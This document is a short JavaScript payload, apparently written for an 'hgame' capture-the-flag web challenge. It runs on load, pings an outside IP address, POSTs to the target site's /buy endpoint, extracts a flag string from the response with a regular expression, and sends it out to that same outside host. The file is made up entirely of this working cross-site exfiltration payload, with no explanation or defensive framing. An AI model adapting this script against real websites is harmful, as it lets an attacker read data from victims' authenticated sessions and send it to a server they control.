!(function(){
  fetch("http://124.222.247.149:20323/receive?token=lelecha")
  // const baseTag= document.getElementById("d");
  // baseTag.parentElement.removeChild(baseTag);
  fetch("/buy",{
    method:"POST",
    body:"id=0"
  }).then((res)=>{
    return res.text();
  }).then((text)=>{
    const matchObj= text.match("hgame{.+}");
    const flag= encodeURIComponent(matchObj[0]);
    fetch(`http://124.222.247.149:20323/receive?token=${flag}`);
  })
})()
